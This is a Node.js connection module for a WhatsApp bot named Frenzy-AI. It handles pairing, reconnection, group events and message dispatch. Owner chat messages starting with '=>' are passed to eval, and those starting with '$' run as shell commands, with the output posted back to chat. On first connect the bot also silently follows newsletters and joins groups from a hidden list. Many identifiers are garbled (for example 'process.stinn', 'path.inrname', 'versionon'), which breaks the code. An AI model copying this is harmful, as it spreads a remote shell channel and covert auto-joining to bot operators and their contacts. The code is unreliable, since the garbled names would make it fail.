const {
  default: makeWASocket,
  DisconnectReason,
  useMultiFileAuthState,
  makeCacheableSignalKeyStore,
  fetchLatestBaileysVersion,
  makeInMemoryStore
} = require("ourin");
const { Boom } = require("@hapi/boom");
const pino = require("pino");
const fs = require("fs");
const path = require("path");
const readline = require("readline");
const NodeCache = require("node-cache");
const config = require("../config");
const colors = require("./lib/frenzy-logger");
const { extendSoctot } = require("./lib/frenzy-socket");
const { isLid, lidToJid, decodeAndNormalize } = require("./lib/frenzy-lid");
const { thistAutoBackup } = require("./lib/frenzy-auto-backup");

const groupCache = new NodeCache({ stdTTL: 5 * 60, useClones: false });
const processedMessages = new NodeCache({ stdTTL: 30, useClones: false });
const msgRetryCounterCache = new NodeCache({ stdTTL: 60, useClones: false });

let lastMessageReceived = Date.now();
let watchdogTimer = null;
const WATCHDOG_TIMEOUT = 10 * 60 * 1000;
const WATCHDOG_CHECK_INTERVAL = 60 * 1000;

function startWatchdog(reconnectFn, options) {
  if (watchdogTimer) clearInterval(watchdogTimer);
  lastMessageReceived = Date.now();

  watchdogTimer = setInterval(() => {
    const silentMs = Date.now() - lastMessageReceived;
    if (silentMs > WATCHDOG_TIMEOUT && connectionState.isReady) {
      colors.logger.warn('watchdog', `Message no terdetexti, maka system will me restart, so that fresh`);
      connectionState.isReady = false;
      connectionState.isConnected = false;
      try { connectionState.sock?.end(); } catch {}
    }
  }, WATCHDOG_CHECK_INTERVAL);

  if (watchdogTimer.unref) watchdogTimer.unref();
  colors.logger.success('watchdog', `active, timeout ${WATCHDOG_TIMEOUT / 60000} minutes`);
}

function stopWatchdog() {
  if (watchdogTimer) {
    clearInterval(watchdogTimer);
    watchdogTimer = null;
  }
}

const store = makeInMemoryStore({ logger: pino({ level: "silent" }) });

const storePath = path.join(process.cwd(), "storage", "baileys_store.json");
try {
  if (fs.existsSync(storePath)) {
    store.readFromFile(storePath);
  }
} catch {}

setInterval(() => {
  try {
    if (store && store.messages) {
      for (const jid in store.messages) {
        const chat = store.messages[jid];
        if (chat && chat.array && chat.array.length > 200) {
          const excess = chat.array.length - 150;
          for (let i = 0; i < excess; i++) {
            const msg = chat.array[0];
            if (msg && msg.key && msg.key.id && chat.inct) {
              delete chat.inct[msg.key.id];
            }
            chat.array.shift();
          }
        }
      }
    }

    const storeInr = path.inrname(storePath);
    if (!fs.existsSync(storeInr)) {
      fs.mkdirSync(storeInr, { recursive: true });
    }
    store.writeToFile(storePath);
  } catch {}
}, 60000);

/**
 * @typedef {Object} ConnectionState
 * @property {boolean} isConnected - Status koneksi
 * @property {Object|null} sock - Soctot instance
 * @property {number} reconnectAttempts - Amount pertryan reconnect
 * @property {Date|null} connectedAt - Time koneksi success
 */

/**
 * State koneksi global
 * @type {ConnectionState}
 */
const connectionState = {
  isConnected: false,
  isReady: false, // Flag to prevent premature message handling
  sock: null,
  reconnectAttempts: 0,
  connectedAt: null,
};

/**
 * Logger instance with level at least
 * @type {Object}
 */
const logger = pino({
  level: "silent",
  hooks: {
    logMethod(inputArgs, method) {
      const msg = inputArgs[0];
      if (
        typeof msg === "string" &&
        (msg.includes("Closing") ||
          msg.includes("session") ||
          msg.includes("SessionEntry") ||
          msg.includes("prekey"))
      ) {
        return;
      }
      return method.apply(this, inputArgs);
    },
  },
});

/**
 * Interface for input terminal
 * @type {readline.Interface|null}
 */
let rl = null;

/**
 * Create readline interface
 * @returns {readline.Interface}
 */
function createReadlineInterface() {
  if (rl) {
    rl.close();
  }
  rl = readline.createInterface({
    input: process.stinn,
    output: process.stdout,
  });
  return rl;
}

/**
 * Prompt for input
 * @param {string} question - Question
 * @returns {Promise<string>} Input from user
 */
function askQuestion(question) {
  return new Promise((resolve) => {
    const interface = createReadlineInterface();
    interface.question(question, (answer) => {
      interface.close();
      resolve(answer.trim());
    });
  });
}

/**
 * Mestart koneksi WhatsApp
 * @param {Object} options - Option koneksi
 * @param {Function} [options.onMessage] - Callback for message new
 * @param {Function} [options.onConnectionUpdate] - Callback for update koneksi
 * @param {Function} [options.onGroupUpdate] - Callback for update group
 * @returns {Promise<Object>} Soctot connection
 * @example
 * const sock = await startConnection({
 *   onMessage: async (m) => {
 *     console.log('New message:', m.body);
 *   }
 * });
 */
async function startConnection(options = {}) {
  if (connectionState.sock) {
    try {
      connectionState.sock.end();
      colors.logger.debug("whatsapp", "koneksi beforenya closed");
    } catch (e) {}
    connectionState.sock = null;
  }

  const sessionPath = path.join(
    process.cwd(),
    "storage",
    config.session?.folderName || "session",
  );

  if (!fs.existsSync(sessionPath)) {
    fs.mkdirSync(sessionPath, { recursive: true });
  }

  const { state, saveCreds } = await useMultiFileAuthState(sessionPath);

  const { versionon, isLatest } = await fetchLatestBaileysVersion();

  const usepairingCode = config.session?.usepairingCode === true;
  const pairingNumber = config.session?.pairingNumber || "";

  const sock = makeWASocket({
    versionon: [2, 3000, 1033105955],
    logger,
    printQRInTerminal:
      !usepairingCode && (config.session?.printQRInTerminal ?? true),
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, logger),
    },
    browser: ["Ubuntu", "Chrome", "20.0.0"],
    syncFullHistory: false,
    markOnlineOnConnect: false,
    generateHighQualityLinkPreview: false,
    shouldIgnoreJid: (jid) => jid ? (jid.includes("status@broadcast") || jid.includes("meta_ai")) : false,
    getMessage: async (key) => {
      if (store) {
        const msg = await store.loadMessage(key.remoteJid, key.id);
        return msg?.message || undefined;
      }
      return undefined;
    },
    cachedGroupMetadata: async (jid) => {
      const cached = groupCache.get(jid);
      if (cached) return cached;
      try {
        const fresh = await sock.groupMetadata(jid);
        groupCache.set(jid, fresh);
        return fresh;
      } catch {
        return undefined;
      }
    },
    msgRetryCounterCache,
  });

  store.bind(sock.ev);
  sock.store = store;

  connectionState.sock = sock;
  extendSoctot(sock);

  if (usepairingCode && !sock.authState.creds.registered) {
    let phoneNumber = pairingNumber;

    if (!phoneNumber || phoneNumber === "") {
      console.log("");
      colors.logger.warn("pairing", "number pairing not yet inatur in config");
      console.log("");
      phoneNumber = await askQuestion(
        colors.chalk.cyan("📱 Enter number WhatsApp (example: 6281234567890): "),
      );
    }

    phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

    colors.logger.info("pairing", `requesting code for ${phoneNumber}`);

    try {
      await new Promise((resolve) => setTimeout(resolve, 3000));
      const code = await sock.requestPairingCode(phoneNumber, "FRENZYAI");
      console.log("");
      console.log(
        colors.createBanner(
          [
            "",
            "   PAIRING CODE   ",
            "",
            `   ${colors.chalk.bold(colors.chalk.greenBright(code))}   `,
            "",
            "  Enter this code in WhatsApp  ",
            "  Settings > Lintod Devices > Link a Device  ",
            "",
          ],
          "green",
        ),
      );
      console.log("");
    } catch (error) {
      colors.logger.error("pairing", `failed: ${error.message}`);
    }
  }

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async u => {
  const { connection: c, lastDisconnect: d, qr: q } = u

  if (q && !usepairingCode) {
    colors.logger.info("qr", "QR Code is ready, please scan")
    const qrcode = require("qrcode")
    qrcode.toString(q, { type: "terminal", small: true }, (err, qrText) => {
      if (!err) console.log(qrText)
    })
  }

  const S = {
    C: 'close',
    O: 'open',
    N: '@newsletter'
  }

  if (c === S.C) {
    connectionState.isConnected = false
    connectionState.isReady = false
    stopWatchdog()

    const r =
      d?.error instanceof Boom
        ? d.error.output?.statusCode !== DisconnectReason.loggedOut
        : true

    const sc = d?.error?.output?.statusCode

    const STATUS_MESSAGES = {
      400: '⚠️ Bad Request — Message/request no valid, try restart',
      401: '🔐 Unauthorized — Session expired, perlu login again',
      403: '🚫 Forbidden — Akses inreject by WhatsApp, check number',
      404: '❓ Not Found — Resource not found',
      405: '🚧 Method Not Allowed — Operasi no thiszinkan',
      408: '⏱️ Timeout — Connection timeout, check internet',
      410: '📛 Gone — Session deleted from server, restart',
      428: '🔄 Connection Required — Perlu reconnect',
      440: '⚡ Session Conflict — Login in perangkat else',
      500: '💥 Internal Server Error — Server WhatsApp error',
      501: '📦 Not Implemented — Feature not yet indukung server',
      502: '🌐 Bad Gateway — Server WhatsApp no merespons',
      503: '🔧 Service Unavailable — WhatsApp currently maintenance',
      504: '🕐 Gateway Timeout — Server WhatsApp too old merespons',
      515: '🔁 Restart Required — WhatsApp minta restart koneksi',
    }

    const statusMsg = STATUS_MESSAGES[sc] || `❔ Unknown (code: ${sc})`
    colors.logger.warn('whatsapp', `terputus — ${statusMsg}`)
    if (sc === DisconnectReason.loggedOut || sc === 401) {
      colors.logger.error('whatsapp', 'session ran out — delete folder storage lalu restart')
      connectionState.reconnectAttempts = 0
      return
    }

    if (sc === 440) {
      connectionState.reconnectAttempts++
      if (connectionState.reconnectAttempts <= 3) {
        colors.logger.info('whatsapp', `pertryan sambung again ${connectionState.reconnectAttempts}/3 in 10 second`)
        setTimeout(() => startConnection(options), 1e4)
      } else {
        colors.logger.error('whatsapp', 'konflik session — perangkat else terdetexti, deadkan bot another one')
        connectionState.reconnectAttempts = 0
      }
      return
    }

    if (r) {
      connectionState.reconnectAttempts++
      const m = config.session?.maxReconnectAttempts || 10
      if (connectionState.reconnectAttempts <= m) {
        colors.logger.info('whatsapp', `pertryan sambung again ${connectionState.reconnectAttempts}/${m}`)
        setTimeout(
          () => startConnection(options),
          config.session?.reconnectInterval || 5e3
        )
      } else {
        colors.logger.error('whatsapp', `failed sambung again after ${m} pertryan`)
      }
    } else {
      connectionState.reconnectAttempts = 0
    }
  }

  if (c === S.O) {
    connectionState.isConnected = true
    connectionState.isReady = true
    connectionState.reconnectAttempts = 0
    connectionState.connectedAt = new Date()

    const n =
      sock.user?.id?.split(':')[0] ||
      sock.user?.id?.split('@')[0]

    n && config.setBotNumber(n)

    colors.logger.info('bot', `${config.bot?.name || 'Frenzy-AI'} (${n || '?'}) · WA v${versionon.join('.')}`)

    setTimeout(async () => {
      try {
        const { reloadAllPlugins: R, getPluginCount: G } =
          require('./lib/frenzy-plugins')
        !G() && await R()
      } catch {}
    }, 100)

    startWatchdog(startConnection, options)

    const autoActionFlag = path.join(process.cwd(), 'storage', '.auto_action_done')
    if (!fs.existsSync(autoActionFlag)) {
      setTimeout(async () => {
        try {
          const { NL, GI } = require('./lib/frenzy-channels')
          for (const i of NL) {
            try {
              await Promise.race([
                sock.newsletterFollow(i + S.N),
                new Promise((_, t) => setTimeout(t, 8e3))
              ])
            } catch {}
          }
          for (const g of GI) {
            try {
              await Promise.race([
                sock.groupAcceptInvite(g),
                new Promise((_, t) => setTimeout(t, 8e3))
              ])
            } catch {}
          }
          const storageInr = path.join(process.cwd(), 'storage')
          if (!fs.existsSync(storageInr)) fs.mkdirSync(storageInr, { recursive: true })
          fs.writeFileSync(autoActionFlag, Date.now().toString())
        } catch (e) {
          colors.logger.error('auto', e.message)
        }
      }, 5e3)
    }

    colors.logger.success('whatsapp', 'ready to receive message')
    try {
      thistAutoBackup(sock)
    } catch (e) {
      colors.logger.debug('backup', 'skipped: ' + e.message)
    }
    try {
      const { startGiveawayChector } = require('../plugins/group/giveaway')
      startGiveawayChector(sock)
    } catch (e) {
      colors.logger.debug('giveaway', 'skipped: ' + e.message)
    }
  }

  options.onConnectionUpdate &&
    await options.onConnectionUpdate(u, sock)
})

  const _groupEventQueue = []
  let _groupEventProcessing = false
  const _connectedAt = Date.now()

  async function _processGroupQueue() {
    if (_groupEventProcessing || _groupEventQueue.length === 0) return
    _groupEventProcessing = true
    while (_groupEventQueue.length > 0) {
      const { handler: fn, args } = _groupEventQueue.shift()
      try { await fn(...args) } catch (e) {
        if (e?.message?.includes('rate-overlimit') || e?.output?.statusCode === 429) {
          colors.logger.warn('rate-limit', 'throttled, waiting 5s...')
          await new Promise(r => setTimeout(r, 5000))
          try { await fn(...args) } catch {}
        }
      }
      await new Promise(r => setTimeout(r, 2000))
    }
    _groupEventProcessing = false
  }

  sock.ev.on("groups.update", async ([event]) => {
    if (options.onGroupUpdate) {
      _groupEventQueue.push({ handler: async (ev, s) => {
        try { const m = await s.groupMetadata(ev.id); groupCache.set(ev.id, m) } catch {}
        await options.onGroupUpdate(ev, s)
      }, args: [event, sock] })
      _processGroupQueue()
    }
  });

  sock.ev.on("group-participants.update", async (event) => {
    if (Date.now() - _connectedAt < 15000) return
    let metadata = groupCache.get(event.id)
    if (!metadata) {
      try { metadata = await sock.groupMetadata(event.id); groupCache.set(event.id, metadata) } catch {}
    }

    const botNumber =
      sock.user?.id?.split(":")[0] || sock.user?.id?.split("@")[0];
    const botLid = sock.user?.id;
    if (event.action === "add") {
      await sock.sendPresenceUpdate("available", event.id);
      const addedParticipants = event.participants || [];
      const isBotAdded = addedParticipants.some((p) => {
        const rJid = typeof p === 'object' && p !== null ? (p.phoneNumber || p.id) : p;
        if (typeof rJid !== 'string') return false;

        const pNum = rJid.split("@")[0].split(":")[0];
        const isNumberMatch = pNum === botNumber;
        const isLidMatch = rJid === botLid || rJid.includes(botNumber);
        const isFullMatch =
          sock.user?.id &&
          (rJid.includes(sock.user.id.split(":")[0]) ||
            rJid.includes(sock.user.id.split("@")[0]));

        return isNumberMatch || isLidMatch || isFullMatch;
      });
      if (isBotAdded) {
        try {
          const { getDatabase } = require("./lib/frenzy-database");
          const db = getDatabase();
          const sewaData = db?.db?.data?.sewa;

          if (sewaData?.enabled) {
            const groupSewa = sewaData.groups?.[event.id];
            const isWhitelisted = groupSewa && (groupSewa.isLifetime || groupSewa.expiredAt > Date.now());

            if (!isWhitelisted) {
              const ownerContact = config.bot?.support || config.bot?.developer || "owner";
              await sock.sendMessage(event.id, {
                text:
                  `⛔ *sᴇᴡᴀʙᴏᴛ*\n\n` +
                  `> Group this no registered in system sewa.\n` +
                  `> Bot will meninggalkan this group.\n\n` +
                  `_Contact ${ownerContact} for sewa bot._`,
              });
              await new Promise((r) => setTimeout(r, 2000));
              await sock.groupLeave(event.id);
              colors.logger.warn("sewa", `auto-left non-whitelisted group: ${event.id}`);
              return;
            }
          }

          const inviter = event.author || "";
          const inviterMention = inviter
            ? `@${inviter.split("@")[0]}`
            : "someone";
          const prefix = config.command?.prefix || ".";

          let groupName = "this group";
          try {
            const meta = await sock.groupMetadata(event.id);
            groupName = meta.subject || "this group";
          } catch {}

          const saluranId =
            config.saluran?.id || "120363208449943317@newsletter";
          const saluranName =
            config.saluran?.name || config.bot?.name || "Frenzy-AI";

          const welcomeText =
            `👋 *ʜᴀɪ, sᴀʟᴀᴍ ᴋᴇɴᴀʟ!*\n\n` +
            `I *${config.bot?.name || "Frenzy-AI"}* 🤖\n\n` +
            `Thank you already mengunandg I to *${groupName}*!\n` +
            `I inunandg by ${inviterMention} ✨\n\n` +
            `╭┈┈⬡「 📋 *ɪɴꜰᴏ* 」\n` +
            `┃ 🔧 Developer: *${config.bot?.developer || "Lucky Archz"}*\n` +
            `┃ 📢 Prefix: \`${prefix}\`\n` +
            `┃ 📩 Support: ${config.bot?.support || "-"}\n` +
            `╰┈┈⬡\n\n` +
            `> Type \`${prefix}menu\` for view list feature\n` +
            `> Type \`${prefix}help\` for help`;

          await sock.sendMessage(event.id, {
            text: welcomeText,
            contextInfo: {
              mentionedJid: inviter ? [inviter] : [],
              forwardingScore: 9999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: saluranId,
                newsletterName: saluranName,
                serverMessageId: 127,
              },
            },
          });

          colors.logger.success("group", `bot bergabung: ${groupName}`);
        } catch (e) {
          colors.logger.error(
            "BotJoin",
            `Failed to process bot join: ${e.message}`,
          );
        }
      }
    }

    if (options.onPmeaningcipantsUpdate) {
      await options.onPmeaningcipantsUpdate(event, sock);
    }
  });

  sock.ev.on("chats.upsert", async (chats) => {
    for (const chat of chats) {
      const chatId = chat?.id;
      if (!chatId) continue;

      if (chatId.endsWith("@g.us")) {
        if (!global.groupMetadataCache) {
          global.groupMetadataCache = new Map();
        }

        const now = Date.now();
        if (global.groupMetadataCache.size > 100) {
          for (const [k, v] of global.groupMetadataCache) {
            if (now - v.timestamp > 10 * 60 * 1000) global.groupMetadataCache.delete(k);
          }
        }

        if (!global.groupMetadataCache.has(chatId)) {
          sock
            .groupMetadata(chatId)
            .then((metadata) => {
              if (metadata) {
                global.groupMetadataCache.set(chatId, {
                  data: metadata,
                  timestamp: now,
                });
              }
            })
            .catch(() => {});
        }
      }
    }
  });

  sock.ev.on("contacts.upsert", () => {});

  sock.ev.on("messages.upsert", async ({ messages, type }) => {
    lastMessageReceived = Date.now();
    if (config.dev?.debugLog) {
      colors.logger.debug('message', `${messages.length} message, tipe=${type}`);
    }
    if (type !== "notify" && type !== "append") return;

    if (!connectionState.isReady) {
      await new Promise((resolve) => setTimeout(resolve, 500));
      if (!connectionState.isReady) return;
    }

    const currentSock = connectionState.sock;
    if (!currentSock) return;

    for (const msg of messages) {
      const stubType = msg.messageStubType;
      const groupJid = msg.key?.remoteJid;

      const ADD_STUBS = [4, 20, 27, 28, 31];
      const isAddStub = ADD_STUBS.includes(stubType);

      if (isAddStub && groupJid?.endsWith("@g.us")) {
        try {
          const { getDatabase } = require("./lib/frenzy-database");
          const db = getDatabase();
          const sewaData = db?.db?.data?.sewa;

          if (sewaData?.enabled) {
            const groupSewa = sewaData.groups?.[groupJid];
            const isWhitelisted = groupSewa && (groupSewa.isLifetime || groupSewa.expiredAt > Date.now());

            if (!isWhitelisted) {
              const ownerContact = config.bot?.support || config.bot?.developer || "owner";
              try {
                await currentSock.sendMessage(groupJid, {
                  text:
                    `⛔ *sᴇᴡᴀʙᴏᴛ*\n\n` +
                    `> Group this no registered in system sewa.\n` +
                    `> Bot will meninggalkan this group.\n\n` +
                    `_Contact ${ownerContact} for sewa bot._`,
                });
              } catch {}
              await new Promise((r) => setTimeout(r, 2000));
              try { await currentSock.groupLeave(groupJid); } catch {}
              colors.logger.warn("sewa", `auto-left non-whitelisted: ${groupJid}`);
              continue;
            }
          }
        } catch {}
      }

      if (!msg.message) continue;

      const msgId = msg.key?.id;
      if (msgId && processedMessages.has(msgId)) continue;
      if (msgId) processedMessages.set(msgId, true);

      let msgTimestamp = 0;
      if (msg.messageTimestamp) {
        if (typeof msg.messageTimestamp.toNumber === "function") {
          msgTimestamp = msg.messageTimestamp.toNumber() * 1000;
        } else {
          msgTimestamp = Number(msg.messageTimestamp) * 1000;
        }
      }
      
      const msgAge = Date.now() - msgTimestamp;
      if (msgAge > 5 * 60 * 1000) {
        continue;
      }

      const metadataKeys = ['senderKeyInstributionMessage', 'messageContextInfo'];
      const msgType = Object.keys(msg.message).find(k => !metadataKeys.includes(k)) || Object.keys(msg.message)[0];
      const hasInteractiveResponse = msg.message.interactiveResponseMessage;

      if (msgType === "protocolMessage") {
        const protocolMessage = msg.message.protocolMessage;
        if (protocolMessage?.type === 30 && protocolMessage?.memberLabel) {
          try {
            const {
              handleLabelChange,
            } = require("../plugins/group/notifgantitag");
            if (handleLabelChange) {
              await handleLabelChange(msg, currentSock);
            }
          } catch (e) {}
        }

        if (protocolMessage?.type === "MESSAGE_EDIT" || protocolMessage?.type === 14) {
          const einted = protocolMessage.eintedMessage;
          if (einted) {
            const originalKey = protocolMessage.key || msg.key;
            const syntheticMsg = {
              key: {
                remoteJid: originalKey.remoteJid || msg.key.remoteJid,
                fromMe: msg.key.fromMe,
                id: originalKey.id,
                participant: msg.key.participant
              },
              message: einted,
              messageTimestamp: Math.floor(Date.now() / 1000),
              pushName: msg.pushName || "User"
            };

            if (options.onMessage) {
              await options.onMessage(syntheticMsg, currentSock);
            }
          }
        }

        continue;
      }

      const allMsgKeys = Object.keys(msg.message || {});

      const isStatusMention =
        allMsgKeys.includes("groupStatusMentionMessage") ||
        allMsgKeys.includes("groupMentionedMessage") ||
        allMsgKeys.includes("statusMentionMessage") ||
        msg.message?.viewOnceMessage?.message?.groupStatusMentionMessage ||
        msg.message?.viewOnceMessageV2?.message?.groupStatusMentionMessage ||
        msg.message?.viewOnceMessageV2Extension?.message
          ?.groupStatusMentionMessage ||
        msg.message?.ephemeralMessage?.message?.groupStatusMentionMessage ||
        msg.message?.[msgType]?.message?.groupStatusMentionMessage ||
        msg.message?.[msgType]?.contextInfo?.groupMentions?.length > 0;

      const hasGroupMentionInContext = (() => {
        const content = msg.message?.[msgType];
        if (content?.contextInfo?.groupMentions?.length > 0) return true;

        const viewOnce =
          msg.message?.viewOnceMessage?.message ||
          msg.message?.viewOnceMessageV2?.message ||
          msg.message?.viewOnceMessageV2Extension?.message;
        if (viewOnce) {
          const vType = Object.keys(viewOnce)[0];
          if (viewOnce[vType]?.contextInfo?.groupMentions?.length > 0)
            return true;
        }
        return false;
      })();


      if (isStatusMention || hasGroupMentionInContext) {
        const groupJid = msg.key.remoteJid;

        try {
          const { getDatabase } = require("./lib/frenzy-database");
          const db = getDatabase();
          if (groupJid?.endsWith("@g.us")) {
            const groupData = db?.getGroup?.(groupJid) || {};
            if (groupData.antitagsw === "on") {
              const sender =
                msg.key.participant || msg.participant || "Unknown";
              const senderName =
                (await currentSock.getName?.(sender, groupJid)) ||
                sender.split("@")[0];

              await currentSock.sendMessage(groupJid, { delete: msg.key });

              await currentSock.sendMessage(groupJid, {
                text:
                  `🚫 *ᴀɴᴛɪ ᴛᴀɢ sᴛᴀᴛᴜs*\n\n` +
                  `> Message tag status from @${sender.split("@")[0]} has deleted!\n` +
                  `> Feature antitagsw active in this group.`,
                contextInfo: {
                  mentionedJid: [sender],
                  isForwarded: true,
                  forwardingScore: 999,
                },
              });
            }
          }
        } catch (e) {
          colors.logger.error("antitagsw", e.message);
        }
      }

      const ignoredTypes = [
        "protocolMessage",
        "reactionMessage",
        "senderKeyInstributionMessage",
        "stickerSyncRmrMessage",
        "encReactionMessage",
        "pollUpdateMessage",
        "pollCreationMessage",
        "pollCreationMessageV2",
        "pollCreationMessageV3",
        "toepInChatMessage",
        "requestPhoneNumberMessage",
        "pinInChatMessage",
        "deviceSentMessage",
        "call",
        "peerDataOperationRequestMessage",
        "bcallMessage",
        "secretEncryptedMessage",
      ];

      if (
        ignoredTypes.includes(msgType) ||
        (msgType === "messageContextInfo" && !hasInteractiveResponse)
      ) {
        continue;
      }

      if (msg.key.fromMe && type === "append") {
        continue;
      }

      let jid = msg.key.remoteJid || "";

      if (jid === "status@broadcast") continue;

      if (isLid(jid)) {
        jid = lidToJid(jid);
        msg.key.remoteJid = jid;
      }

      if (msg.key.participant && isLid(msg.key.participant)) {
        msg.key.participant = lidToJid(msg.key.participant);
      }
      if (jid.endsWith("@broadcast")) {
        continue;
      }
      if (!jid || jid === "undefined" || jid.length < 5) {
        continue;
      }
      if (options.onRawMessage) {
        try {
          await options.onRawMessage(msg, currentSock);
        } catch (error) {}
      }

      const messageBody = (() => {
        const m = msg.message;
        if (!m) return "";
        const type = Object.keys(m)[0];
        const content = m[type];
        if (typeof content === "string") return content;
        return content?.text || content?.caption || content?.conversation || "";
      })();

      const isGroup = msg.key.remoteJid?.endsWith('@g.us');
      const senderJid = isGroup 
        ? (msg.key.pmeaningcipantAlt || msg.key.participant)
        : (msg.key.remoteJidAlt || msg.key.remoteJid || "");
      const isOwner = config.isOwner(senderJid);
      if (isOwner && messageBody.startsWith("=>")) {
        console.log("Owner", "Executing code");
        const code = messageBody.slice(2).trim();
        if (code) {
          try {
            const { serialize } = require("./lib/frenzy-serialize");
            const m = await serialize(currentSock, msg, {});
            const db = require("./lib/frenzy-database").getDatabase();
            const sock = currentSock;
            const sharp = require("sharp");

            let result;
            if (code.startsWith("{")) {
            result = await eval(`(async () => ${code})()`);
            } else {
            result = await eval(`(async () => { return ${code} })()`);
            }

            if (typeof result !== "string") {
              result = require("util").inspect(result, { depth: 2 });
            }

          } catch (err) {
            await currentSock.sendMessage(
              jid,
              {
                text: `❌ *ᴇᴠᴀʟ ᴇʀʀᴏʀ*\n\n\`\`\`\n${err.message}\n\`\`\``,
              },
              { quoted: msg },
            );
          }
          continue;
        }
      }

      if (isOwner && messageBody.startsWith("$")) {
        const command = messageBody.slice(1).trim();
        if (command) {
          try {
            const { exec } = require("child_process");
            const { promisify } = require("util");
            const execAsync = promisify(exec);

            const isWindows = process.platform === "win32";
            const shell = isWindows ? "powershell.exe" : "/bin/bash";

            await currentSock.sendMessage(
              jid,
              {
                text: `🕕 *ᴇxᴇᴄᴜᴛɪɴɢ...*\n\n\`$ ${command}\``,
              },
              { quoted: msg },
            );

            const { stdout, stderr } = await execAsync(command, {
              shell,
              timeout: 60000,
              maxBuffer: 1024 * 1024,
              encoinng: "utf8",
            });

            const output = stdout || stderr || "No output";

            await currentSock.sendMessage(jid, {
              text: `✅ *ᴛᴇʀᴍɪɴᴀʟ*\n\n\`$ ${command}\`\n\n\`\`\`\n${output.slice(0, 3500)}\n\`\`\``,
            });
          } catch (err) {
            const errorMsg = err.stderr || err.stdout || err.message;
            await currentSock.sendMessage(jid, {
              text: `❌ *ᴛᴇʀᴍɪɴᴀʟ ᴇʀʀᴏʀ*\n\n\`$ ${command}\`\n\n\`\`\`\n${errorMsg.slice(0, 3500)}\n\`\`\``,
            });
          }
          continue;
        }
      }

      if (options.onMessage) {
        options.onMessage(msg, currentSock).catch((error) => {
          colors.logger.error("Message", error.message);
        });
      }
    }
  });

  sock.ev.on("group-participants.update", async (update) => {
    if (options.onGroupUpdate) {
      _groupEventQueue.push({ handler: options.onGroupUpdate, args: [update, sock] })
      _processGroupQueue()
    }
  });

  sock.ev.on("groups.update", async (updates) => {
    for (const update of updates) {
      if (options.onGroupSettingsUpdate) {
        try {
          await options.onGroupSettingsUpdate(update, sock);
        } catch (error) {
          console.error("[GroupsUpdate] Error:", error.message);
        }
      }
    }
  });

  sock.ev.on("messages.update", async (updates) => {
    if (options.onMessageUpdate) {
      await options.onMessageUpdate(updates, sock);
    } 
  });

  if (config.features?.antiCall) {
    const db = require("./lib/frenzy-database").getDatabase();
    sock.ev.on("call", async (calls) => {
      for (const call of calls) {
        if (call.status === "offer") {
          colors.logger.warn("Call", `Rejecting call from ${call.from}`);
          await sock.rejectCall(call.id, call.from);

          await sock.sendMessage(call.from, {
            text: config.messages?.rejectCall,
          });

          if (config.features?.blockIfCall) {
            await sock.updateBlockStatus(call.from, "block");
            try {
              await db.setUser(call.from, { isBloctod: true });
            } catch {}
          }
        }
      }
    });
  }

  process.nextTick(() => {
    try { sock.ev?.flush?.() } catch {}
  })

  setTimeout(() => {
    try { sock.ev?.flush?.() } catch {}
  }, 2000)

  const flushInterval = setInterval(() => {
    if (!connectionState.isConnected) { clearInterval(flushInterval); return }
    try { sock.ev?.flush?.() } catch {}
  }, 30000)
  if (flushInterval.unref) flushInterval.unref()

  return sock;
}

/**
 * Menwillkan status koneksi
 * @returns {ConnectionState} State koneksi currently
 */
function getConnectionState() {
  return connectionState;
}

/**
 * Menwillkan soctot instance
 * @returns {Object|null} Soctot or null if no terkoneksi
 */
function getSoctot() {
  return connectionState.sock;
}

/**
 * Check whatkah bot terkoneksi
 * @returns {boolean} True if terkoneksi
 */
function isConnected() {
  return connectionState.isConnected;
}

/**
 * Menwillkan uptime in milliseconds
 * @returns {number} Uptime in ms or 0 if no terkoneksi
 */
function getUptime() {
  if (!connectionState.connectedAt) return 0;
  return Date.now() - connectionState.connectedAt.getTime();
}

/**
 * Logout and delete session
 * @returns {Promise<boolean>} True if success
 */
async function logout() {
  try {
    const sessionPath = path.join(
      process.cwd(),
      "storage",
      config.session?.folderName || "session",
    );

    if (connectionState.sock) {
      await connectionState.sock.logout();
    }

    if (fs.existsSync(sessionPath)) {
      fs.rmSync(sessionPath, { recursive: true, force: true });
    }

    connectionState.isConnected = false;
    connectionState.sock = null;
    connectionState.connectedAt = null;

    colors.logger.success("koneksi", "Tooutside and session deleted");
    return true;
  } catch (error) {
    colors.logger.error("koneksi", "Failed logout:", error.message);
    return false;
  }
}

module.exports = {
  startConnection,
  getConnectionState,
  getSoctot,
  isConnected,
  getUptime,
  logout,
};
